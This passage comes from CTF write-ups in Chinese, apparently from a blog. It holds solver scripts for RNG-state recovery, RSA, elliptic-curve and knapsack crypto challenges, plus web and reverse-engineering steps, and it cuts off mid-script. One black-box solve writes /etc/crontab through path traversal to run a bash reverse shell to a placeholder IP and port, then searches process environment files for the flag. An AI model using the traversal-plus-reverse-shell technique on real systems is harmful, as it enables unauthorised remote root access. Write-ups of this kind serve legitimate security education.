operator\">=</span><span class=\"token number\">1250</span>\nD<span class=\"token operator\">=</span>Dall<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span>n<span class=\"token punctuation\">]</span>\nrng<span class=\"token operator\">=</span>Random<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">getRows</span><span class=\"token punctuation\">(</span>rng<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    row<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>\n    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        row<span class=\"token operator\">+=</span><span class=\"token builtin\">list</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">map</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bin</span><span class=\"token punctuation\">(</span>rng<span class=\"token punctuation\">.</span>getrandbits<span class=\"token punctuation\">(</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>zfill<span class=\"token punctuation\">(</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> row\nM<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">19968</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    state <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token operator\">*</span><span class=\"token number\">624</span>\n    temp <span class=\"token operator\">=</span> <span class=\"token string\">\"0\"</span><span class=\"token operator\">*</span>i <span class=\"token operator\">+</span> <span class=\"token string\">\"1\"</span><span class=\"token operator\">*</span><span class=\"token number\">1</span> <span class=\"token operator\">+</span> <span class=\"token string\">\"0\"</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">19968</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token operator\">-</span>i<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">for</span> j <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">624</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        state<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>temp<span class=\"token punctuation\">[</span><span class=\"token number\">32</span><span class=\"token operator\">*</span>j<span class=\"token punctuation\">:</span><span class=\"token number\">32</span><span class=\"token operator\">*</span>j<span class=\"token operator\">+</span><span class=\"token number\">32</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\n    rng<span class=\"token punctuation\">.</span>setstate<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">tuple</span><span class=\"token punctuation\">(</span>state<span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token number\">624</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token boolean\">None</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> \n    M<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>getRows<span class=\"token punctuation\">(</span>rng<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    \n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'--------------------------------------------------'</span><span class=\"token punctuation\">)</span>\nM<span class=\"token operator\">=</span>Matrix<span class=\"token punctuation\">(</span>GF<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>M<span class=\"token punctuation\">)</span>\ny<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    y<span class=\"token operator\">+=</span><span class=\"token builtin\">list</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">map</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bin</span><span class=\"token punctuation\">(</span>D<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>zfill<span class=\"token punctuation\">(</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\ny<span class=\"token operator\">=</span>vector<span class=\"token punctuation\">(</span>GF<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>y<span class=\"token punctuation\">)</span>\ns<span class=\"token operator\">=</span>M<span class=\"token punctuation\">.</span>solve_left<span class=\"token punctuation\">(</span>y<span class=\"token punctuation\">)</span>\nG<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">624</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    C<span class=\"token operator\">=</span><span class=\"token number\">0</span>\n    <span class=\"token keyword\">for</span> j <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">32</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        C<span class=\"token operator\">&lt;&lt;</span><span class=\"token operator\">=</span><span class=\"token number\">1</span>\n        C<span class=\"token operator\">|</span><span class=\"token operator\">=</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">[</span><span class=\"token number\">32</span><span class=\"token operator\">*</span>i<span class=\"token operator\">+</span>j<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n    G<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>C<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">import</span> random\nRNG1 <span class=\"token operator\">=</span> random<span class=\"token punctuation\">.</span>Random<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">624</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    G<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>G<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\nRNG1<span class=\"token punctuation\">.</span>setstate<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">tuple</span><span class=\"token punctuation\">(</span>G<span class=\"token operator\">+</span><span class=\"token punctuation\">[</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span><span class=\"token number\">624</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token boolean\">None</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\">#------------------------------------------------------------</span>\n<span class=\"token comment\">#控制到当前状态</span>\nRNG1<span class=\"token punctuation\">.</span>getrandbits<span class=\"token punctuation\">(</span><span class=\"token number\">64</span><span class=\"token punctuation\">)</span>\nss<span class=\"token operator\">=</span><span class=\"token number\">0</span>\nd1<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>\n<span class=\"token keyword\">while</span> ss <span class=\"token operator\">&lt;</span> <span class=\"token number\">625</span> <span class=\"token operator\">*</span> <span class=\"token number\">32</span><span class=\"token punctuation\">:</span>\n    d1<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>RNG1<span class=\"token punctuation\">.</span>getrandbits<span class=\"token punctuation\">(</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    d1<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>RNG1<span class=\"token punctuation\">.</span>getrandbits<span class=\"token punctuation\">(</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    ss <span class=\"token operator\">+=</span> <span class=\"token number\">32</span>\n\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>d1<span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">10</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n\n\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'------------att-------------'</span><span class=\"token punctuation\">)</span>\nattack_monster<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> RNG1<span class=\"token punctuation\">,</span>Dall<span class=\"token punctuation\">)</span>\n\np<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\">#--------------------------------------------------------------</span></code></pre>\n\n<p>黑盒部分：</p>\n<p>只有输入文件名以及输入文件内容这些功能</p>\n<p>发现可以文件名任意写，覆盖crontab定时任务，执行shellcode来远程操控</p>\n<pre class=\"language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token punctuation\">..</span><span class=\"token punctuation\">..</span>//<span class=\"token punctuation\">..</span><span class=\"token punctuation\">..</span>//<span class=\"token punctuation\">..</span><span class=\"token punctuation\">..</span>//<span class=\"token punctuation\">..</span><span class=\"token punctuation\">..</span>//etc/crontab\n\n<span class=\"token assign-left variable\"><span class=\"token environment constant\">SHELL</span></span><span class=\"token operator\">=</span>/bin/sh\n\n<span class=\"token assign-left variable\"><span class=\"token environment constant\">PATH</span></span><span class=\"token operator\">=</span>/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\n\n* * * * * root /bin/bash <span class=\"token parameter variable\">-c</span> <span class=\"token string\">'bash -i >&amp; /dev/tcp/IP/PORT 0>&amp;1'</span></code></pre>\n\n<p>获得shell后寻找flag</p>\n<pre class=\"language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token comment\">#linux命令：</span>\n<span class=\"token function\">find</span> / <span class=\"token parameter variable\">-type</span> f <span class=\"token parameter variable\">-exec</span> <span class=\"token function\">grep</span> <span class=\"token parameter variable\">-l</span> <span class=\"token parameter variable\">-i</span> <span class=\"token string\">\"nctf\"</span> <span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span> + <span class=\"token operator\"><span class=\"token file-descriptor important\">2</span>></span>/dev/null\n\n<span class=\"token comment\">#Out:</span>\n/proc/1/task/1/environ\n\n<span class=\"token comment\">#linux命令：</span>\n<span class=\"token function\">cat</span> /proc/1/task/1/environ\n\n<span class=\"token comment\">#Out：</span>\n<span class=\"token assign-left variable\"><span class=\"token environment constant\">PATH</span></span><span class=\"token operator\">=</span>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binHOSTNAME<span class=\"token operator\">=</span>comp-xlcrypsc-67706716887745083pclt4FLAG<span class=\"token operator\">=</span>nctf<span class=\"token punctuation\">&#123;</span>760bd839-02ff-4b4f-b5a9-3b006910963a<span class=\"token punctuation\">&#125;</span>KUBERNETES_PORT<span class=\"token operator\">=</span>tcp://192.168.0.1:443KUBERNETES_PORT_443_TCP<span class=\"token operator\">=</span>tcp://192.168.0.1:443KUBERNETES_PORT_443_TCP_PROTO<span class=\"token operator\">=</span>tcpKUBERNETES_PORT_443_TCP_PORT<span class=\"token operator\">=</span>443KUBERNETES_PORT_443_TCP_ADDR<span class=\"token operator\">=</span><span class=\"token number\">192.168</span>.0.1KUBERNETES_SERVICE_HOST<span class=\"token operator\">=</span><span class=\"token number\">192.168</span>.0.1KUBERNETES_SERVICE_PORT<span class=\"token operator\">=</span>443KUBERNETES_SERVICE_PORT_HTTPS<span class=\"token operator\">=</span>443HOME<span class=\"token operator\">=</span>/root\n</code></pre>\n\n<h3 id=\"QRcode-Reconstruction\"><a href=\"#QRcode-Reconstruction\" class=\"headerlink\" title=\"QRcode Reconstruction\"></a>QRcode Reconstruction</h3><p><img src=\"/images/1742737001478-793cdfb8-490c-40bc-939e-41e4ccc41789.png\">手搓。</p>\n<p>最后decode是</p>\n<p><img src=\"/images/1742737035701-dfd8da36-52fa-4ed1-b08c-ee997cda532a.png\"></p>\n<p>猜到flag是nctf{WeLc0mE_t0_Nctf_2024!!!}</p>\n<h2 id=\"CRYPTO\"><a href=\"#CRYPTO\" class=\"headerlink\" title=\"CRYPTO\"></a>CRYPTO</h2><p>爆零O.o</p>\n"},{"title":"ucsc 不知道 WP","date":"2025-04-21T13:00:49.000Z","typora-root-url":"./..","_content":"\n# 战队名：不知道\n\n**排名**：**1**\n\n![7918DA86D3B117713C82E1F48AA03B79](/images/7918DA86D3B117713C82E1F48AA03B79-1745240699577-65.png)\n\n# Crypto\n\n### **XR4-ucsc**\n\n已知密钥，修改random_num逻辑异或回去即可\n\n```python\nimport base64\nimport random\n# from secret import flag\nimport numpy as np\ndef init_sbox(key):\n    s_box = list(range(256))\n    j = 0\n    for i in range(256):\n        j = (j + s_box[i] + ord(key[i % len(key)])) % 256\n        s_box[i], s_box[j] = s_box[j], s_box[i]\n    return s_box\ndef decrypt(cipher, box):\n    res = []\n    i = j = 0\n    cipher_bytes = base64.b64decode(cipher)\n    for s in cipher_bytes:\n        i = (i + 1) % 256\n        j = (j + box[i]) % 256\n        box[i], box[j] = box[j], box[i]\n        t = (box[i] + box[j]) % 256\n        k = box[t]\n        res.append(chr(s ^ k))\n    return (''.join(res))\ndef random_num(seed_num):\n    random.seed(seed_num)\n    for i in range(6):\n        for j in range(6):\n            print(chr(int(str(random.random()*10000)[0:2]) ^ (transposed_matrix[j][i])),end='')\n\nif __name__ == '__main__':\n    transposed_matrix=[\n[  1 ,111 , 38, 110 , 95 , 44],\n[ 11,  45  ,58,  39  ,84,   1],\n[116 , 19 ,113 , 60  ,91 ,118],\n[ 33  ,98  ,38  ,57  ,10 , 29],\n[ 68  ,52 ,119  ,56 , 43 ,125],\n[ 32  ,32,   7  ,26,  41 , 41]]\n        \n    ciphertext = \"MjM184anvdA=\"\n    key = \"XR4\"\n    box = init_sbox(key)\n    a=decrypt(ciphertext, box)\n    print(a)\n    random_num(int(a))\n```\n\n### **essential-ucsc**\n\n```c++\nfrom Crypto.Util.number import *\nimport sympy\nfrom flag import flag\n\na=getPrime(512)\np=sympy.nextprime(13*a)\nq=sympy.prevprime(25*a)\nnumber2=p*q\n\ndef crypto01(number1, number2, number3):\n    number4 = 1\n    while number2 > 0:\n        if number2 % 2: \n            number4 = (number4 * number1) % number3\n        number1 = number1 ** 2 % number3\n        number2 //= 2\n    return number4\n\ndef crypto02(number1, number2):\n    number3 = number1\n    number4 = number2\n    giao = 1\n    giaogiao = 0\n    while number4 > 0:\n        number7 = number3 // number4\n        giao, giaogiao = giaogiao, giao - giaogiao*number7\n        number3, number4 = number4, number3 - number4*number7\n    while giao<0:\n        giao = giao + number2\n    return giao\n\ndef crypto03(number1, number2, number3):\n    number4 = crypto01(number3, number1, number2)\n    return number4\n\ndef crypto05(number1,number2):\n    return pow(number1,0xe18e,number2)\n\nnumber3 = int.from_bytes(flag[0:19].encode(\"utf-8\"), \"big\")\nnumber4 = int.from_bytes(flag[19:39].encode(\"utf-8\"), \"big\")\n\nprint(crypto03(number1, number2, number3))\nprint(crypto05(number4,number2))\n```\n\n简单看出给出的值为 n3^n1 %n2 和 n4 ^ 0xe18e % n2 \n\n前一个因为p，q的值与a相关，除以因子后开方得到近似值，第二部分因为flag长度较小，直接开方得到flag\n\n```python\nfrom Crypto.Util.number import *\nnumber1 = 6035830951309638186877554194461701691293718312181839424149825035972373443231514869488117139554688905904333169357086297500189578624512573983935412622898726797379658795547168254487169419193859102095920229216279737921183786260128443133977458414094572688077140538467216150378641116223616640713960883880973572260683\nnumber2 = 20163906788220322201451577848491140709934459544530540491496316478863216041602438391240885798072944983762763612154204258364582429930908603435291338810293235475910630277814171079127000082991765275778402968190793371421104016122994314171387648385459262396767639666659583363742368765758097301899441819527512879933947\n\n# n3^n1 %n2\nc1=6624758244437183700228793390575387439910775985543869953485120951825790403986028668723069396276896827302706342862776605008038149721097476152863529945095435498809442643082504012461883786296234960634593997098236558840899107452647003306820097771301898479134315680273315445282673421302058215601162967617943836306076\n# n4 ^ 0xe18e % n2\nc2=204384474875628990804496315735508023717499220909413449050868658084284187670628949761107184746708810539920536825856744947995442111688188562682921193868294477052992835394998910706435735040133361347697720913541458302074252626700854595868437809272878960638744881154520946183933043843588964174947340240510756356766\nfrom gmpy2 import *\n\na=gmpy2.iroot(number2//(13*25),2)[0]\np=sympy.nextprime(13*a)\nprint(p)\nprint(number2%p)\nq=number2//p\n\nphi=(p-1)*(q-1)\nd1=inverse(number1,phi)\nprint(GCD(0xe18e,phi))\n\nd2=inverse(0xe18e//2,phi)\nm2=pow(c2,d2,number2)\n\nf2=int(gmpy2.iroot(m2,2)[0])\n\nf1=pow(c1,d1,number2)\nflag=long_to_bytes(f1)+long_to_bytes(f2)\nprint(flag)\n```\n\n### **MERGE_ECC--ucsc**\n\n```python\nimport random\nfrom sympy import nextprime\ndef part1():\n    p = random_prime(2^512, 2^513)\n    a = random.randint(0, p-1)\n    b = random.randint(0, p-1)\n    while (4 * a**3 + 27 * b**2) % p == 0:\n        a = random.randint(0, p-1)\n        b = random.randint(0, p-1)\n\n    E = EllipticCurve(GF(p), [a, b])\n\n    P=E.random_point()\n\n    n = [random.randint(1, 2**20) for _ in range(3)] \n    assert part1=''.join([hex(i)[2:] for i in n])\n    cipher = [n[i] * P for i in range(3)]\n\n    print(f\"N = {p}\")\n    print(f\"a = {a}, b = {b}\")\n    print(f\"P = {P}\")\n\n    for i in range(3):\n        print(f\"cipher{i} = {cipher[i]}\")\n\ndef part2():\n    p =  839252355769732556552066312852886325703283133710701931092148932185749211043\n    a =  166868889451291853349533652847942310373752202024350091562181659031084638450\n    b =  168504858955716283284333002385667234985259576554000582655928538041193311381\n    P = E.random_point()\n    Q = key*P\n    print(\"p = \",p)\n    print(\"a = \",a)\n    print(\"b = \",b)\n    print(\"P = \",P)\n    print(\"Q = \",Q)\n    assert part2=key\n\npart1()\nprint(\"-------------------------------------------\")\npart2()\nassert flag=\"flag{\"+str(part1)+\"-\"+str(part2)+\"}\"\n```\n\npart1：发现n = [random.randint(1, 2**20) for _ in range(3)] ，在可以爆破的范围，直接爆破出n即可\n\npart2：数字较小直接求离散对数即可\n\n```python\nN = 8186762541745429544201163537921168767557829030115874801599552603320381728161132002130533050721684554609459754424458805702284922582219134865036743485620797\na = 1495420997701481377470828570661032998514190598989197201754979317255564287604311958150666812378959018880028977121896929545639701195491870774156958755735447\nb = 5991466901412408757938889677965118882508317970919705053385317474407117921506012065861844241307270755999163280442524251782766457119443496954015171881396147\nE1 = EllipticCurve(GF(N), [a, b])\nP = E1(6053058761132539206566092359337778642106843252217768817197593657660613775577674830119685211727923302909194735842939382758409841779476679807381619373546323 , 7059796954840479182074296506322819844555365317950589431690683736872390418673951275875742138479119268529134101923865062199776716582160225918885119415223226 )\n\ncipher0 = E1(4408587937721811766304285221308758024881057826193901720202053016482471785595442728924925855745045433966244594468163087104593409425316538804577603801023861 , 5036207336371623412617556622231677184152618465739959524167001889273208946091746905245078901669335908442289383798546066844566618503786766455892065155724816 )\ncipher1 = E1(2656427748146837510897512086140712942840881743356863380855689945832188909581954790770797146584513962618190767634822273749569907212145053676352384889228875 , 4010263650619965046904980178893999473955022015118149348183137418914551275841596653682626506158128955577872592363930977349664669161585732323838763793957500 )\ncipher2 = E1(1836350123050832793309451054411760401335561429787905037706697802971381859410503854213212757333551949694177845513529651742217132039482986693213175074097638 , 1647556471109115097539227566131273446643532340029032358996281388864842086424490493200350147689138143951529796293632149050896423880108194903604646084656434 )\ncipher=[cipher0,cipher1,cipher2]\n'''n=[]\nfrom tqdm import tqdm\nfor k in tqdm(range(2**12,2**20)):\n    if k*P in cipher:\n            n.append(int(k))\n    if len(n)==3:\n        break\n\nprint(n)'''\nn=[651602, 943532, 1008061]\npart1=''.join([hex(i)[2:] for i in n])\nprint(part1)\n\np2 =  839252355769732556552066312852886325703283133710701931092148932185749211043\na2 =  166868889451291853349533652847942310373752202024350091562181659031084638450\nb2 =  168504858955716283284333002385667234985259576554000582655928538041193311381\nE2 = EllipticCurve(GF(p2), [a2, b2])\nP2 =  E2(547842233959736088159936218561804098153493246314301816190854370687622130932 , 259351987899983557442340376413545600148150183183773375317113786808135411950)\nQ =  E2(52509027983019069214323702207915994504051708473855890224511139305828303028 , 520507172059483331872189759719244369795616990414416040196069632909579234481)\n\nkey=P2.discrete_log(Q)\nprint(int(key))\n\nkey1=[1,1,1]\nfor i in range(len(n)):\n    for j in  range(len(cipher)):\n        if n[i]*P==cipher[j]:\n            key1[j]=n[i]\nprint(key1)\n\npart1=''.join([hex(i)[2:] for i in key1])\n\nflag=\"flag{\"+str(part1)+\"-\"+str(key)+\"}\"\nprint(flag)\n```\n\n### **Ez_Calculate-ucsc**\n\n```python\nfrom Crypto.Util.number import *\nfrom random import randint\nfrom hashlib import md5\n\nflag1 = b'xxx'\nflag2 = b'xxx'\nFlags = 'flag{' + md5(flag1+flag2).hexdigest()[::-1] + '}'\n\ndef backpack_encrypt_flag(flag_bytes, M, group_len):\n    bits = []\n    for byte in flag_bytes:\n        bits.extend([int(b) for b in format(byte, \"08b\")])\n\n    while len(bits) % group_len != 0:\n        bits.append(0)\n\n    S_list = []\n    for i in range(0, len(bits), group_len):\n        group = bits[i:i + group_len]\n        S = sum(bit * m for bit, m in zip(group, M))\n        S_list.append(S)\n    return S_list\n\ndef backpack(flag_bytes):\n    R = [10]\n    while len(R) < 8:\n        next_val = randint(2 * R[-1], 3 * R[-1])\n        R.append(next_val)\n    B = randint(2 * R[-1] + 1, 3 * R[-1])\n    A = getPrime(100)\n    M = [A * ri % B for ri in R]\n    S_list = backpack_encrypt_flag(flag_bytes, M, len(M))\n    return R, A, B, M, S_list\n\np = getPrime(512)\nq = getPrime(512)\nn = p*q\ne = 0x10000\nm = bytes_to_long(flag1)\nk = randint(1, 999)\nproblem1 = (pow(p,e,n)-pow(q,e,n)) % n\nproblem2 = pow(p-q,e,n)*pow(e,k,n)\nc = pow(m,e,n)\n\nR, A, B, M, S_list = backpack(flag2)\n\nwith open(r\"C:\\Users\\Rebirth\\Desktop\\data.txt\", \"w\") as f:\n    f.write(f\"problem1 = {problem1}\\n\")\n    f.write(f\"problem2 = {problem2}\\n\")\n    f.write(f\"n = {n}\\n\")\n    f.write(f\"c = {c}\\n\")\n    f.write(\"-------------------------\\n\")\n    f.write(f\"R = {R}\\n\")\n    f.write(f\"A = {A}\\n\")\n    f.write(f\"B = {B}\\n\")\n    f.write(f\"M = {M}\\n\")\n    f.write(f\"S_list = {S_list}\\n\")\n    f.write(\"-------------------------\\n\")\n    f.write(f\"What you need to submit is Flags!\\n\")\n```\n\n分两部分，第一部分e=2**16，使用Tonelli–Shanks以及中国剩余定理求解m\n\n第二部分是普通的超递增背包，求解即可\n\n```python\nfrom Crypto.Util.number import *\nfrom random import randint\nfrom hashlib import md5\n\ne=int(0x10000)\nproblem1 = 24819077530766367166035941051823834496451802693325219476153953490742162231345380863781267094224914358021972805811737102184859249919313532073566493054398702269142565372985584818560322911207851760003915310535736092154713396343146403645986926080307669092998175883480679019195392639696872929250699367519967334248\nproblem2 = 20047847761237831029338089120460407946040166929398007572321747488189673799484690384806832406317298893135216999267808940360773991216254295946086409441877930687132524014042802810607804699235064733393301861594858928571425025486900981252230771735969897010173299098677357738890813870488373321839371734457780977243838253195895485537023584305192701526016\nn = 86262122894918669428795269753754618836562727502569381672630582848166228286806362453183099819771689423205156909662196526762880078792845161061353312693752568577607175166060900619163231849790003982326663277243409696279313372337685740601191870965951317590823292785776887874472943335746122798330609540525922467021\nc = 74962027356320017542746842438347279031419999636985213695851878703229715143667648659071242394028952959096683055640906478244974899784491598741415530787571499313545501736858104610426804890565497123850685161829628373760791083545457573498600656412030353579510452843445377415943924958414311373173951242344875240776\n\nR = [10, 29, 83, 227, 506, 1372, 3042, 6163]\nA = 1253412688290469788410859162653\nB = 16036\nM = [10294, 12213, 10071, 4359, 1310, 4376, 7622, 14783]\nS_list = [13523, 32682, 38977, 44663, 43353, 31372, 17899, 17899, 44663, 16589, 40304, 25521, 31372]\n\nfor k in range(999):\n    e_pow_k = pow(e, k, n)\n    term = (problem1 * e_pow_k) % n\n    candidate = (problem2 + term) % n\n    g = GCD(candidate, n)\n    if g != 1:\n        p=int(g)\n        q=int(n//g)\n        break\n    \nprint(p,q)\nprint(n%p)\nprint(n%q)\n\ndef tonelli_shanks(a, p):\n    Q = p - 1\n    S = 0\n    while Q % 2 == 0:\n        Q //= 2\n        S += 1\n    z = Integer(2)\n    while kronecker_symbol(z, p) != -1:\n        z += 1\n    M = S\n    c_val = power_mod(z, Q, p)\n    t = power_mod(a, Q, p)\n    R = power_mod(a, (Q + 1) // 2, p)\n  \n    while t != 1:\n        i = next(i for i in range(1, M) if power_mod(t, 2**i, p) == 1)\n        b = power_mod(c_val, 2**(M - i - 1), p)\n     \n        R = (R * b) % p\n        t = (t * b * b) % p\n        c_val = (b * b) % p\n        M = i\n    return [Integer(R), Integer(p - R)]\n\ndef eth_root_prime(c_val, p, e_power):\n    assert e_power & (e_power - 1) == 0, \"e 必须为 2 的幂\"\n    k = e_power.bit_length() - 1\n    roots = [Integer(c_val) % p]\n    for _ in range(k):\n        new_roots = []\n        for r in roots:\n            r_mod = Integer(r) % p\n            if r_mod in (0, 1):\n                new_roots.append(r_mod)\n                if r_mod == 1:\n                    new_roots.append(p - 1)\n            else:\n                if kronecker_symbol(r_mod, p) == 1:\n                    sqs = tonelli_shanks(r_mod, p)\n                    new_roots.extend(sqs)\n        roots = list({Integer(x) for x in new_roots})\n    return roots\n\n\ndef recover_plaintexts(c, p, q, e=2**16):\n    roots_p = eth_root_prime(c % p, p, e)\n    roots_q = eth_root_prime(c % q, q, e)\n    candidates = []\n    for rp in roots_p:\n        for rq in roots_q:\n            m = crt([rp, rq], [p, q])\n            candidates.append(m)\n    return candidates\n\nm=recover_plaintexts(c, p, q)\n\nA_inv = inverse(A, B)\nS_primes = [(S * A_inv) % B for S in S_list]\n\nbits = []\nfor s_prime in S_primes:\n    group_bits = []\n    remaining = s_prime\n    for r in reversed(R):\n        if remaining >= r:\n            group_bits.append(1)\n            remaining -= r\n        else:\n            group_bits.append(0)\n    group_bits = group_bits[::-1]\n    bits.extend(group_bits)\n\nflag2 = bytearray()\nfor i in range(0, len(bits), 8):\n    byte_bits = bits[i:i+8]\n    byte = 0\n    for bit in byte_bits:\n        byte = (byte << 1) | bit\n    flag2.append(byte)\n\nflag2 = bytes(flag2).rstrip(b'\\x00')\nprint(\"flag2 =\", flag2)\n\nfor i in m:\n    f1=long_to_bytes(i)\n    print(f1)\n    Flags = 'flag{' + md5(f1+flag2).hexdigest()[::-1] + '}'\n    print(Flags)\n```\n\n# Web\n\n### **ezLaravel-ucsc**\n\nDirsearch出\n\n![img](/images/1745240699576-32.png)\n\n访问flag.php得到flag\n\n# Reverse\n\n### simplere-ucsc\n\nUPX壳，直接dbg+dump即可脱壳。\n\nBase58换表加密\n\n![img](/images/1745240699574-1.png)\n\n![img](/images/1745240699574-2.png)\n\n数据倒转异或加密\n\n![img](/images/1745240699574-3.png)\n\n```C++\n#include <iostream>\n#include <windows.h>\n#include <string>\n#include <vector>\n\nunsigned __int64 decrypt(BYTE *encrypted, unsigned __int64 strlen_, BYTE *decrypted)\n{\n    unsigned __int64 i;\n\n    for (i = 0; i < strlen_; i++)\n    {\n        decrypted[strlen_ - i - 1] = encrypted[i] ^ (i + 1);\n    }\n    return i;\n}\n\nint main()\n{\n    unsigned char Enc[] =\n        {\n            0x72, 0x7A, 0x32, 0x48, 0x34, 0x4E, 0x3F, 0x3A, 0x42, 0x33,\n            0x47, 0x69, 0x75, 0x63, 0x7C, 0x7D, 0x77, 0x62, 0x65, 0x64,\n            0x7B, 0x6F, 0x62, 0x50, 0x73, 0x2B, 0x68, 0x6C, 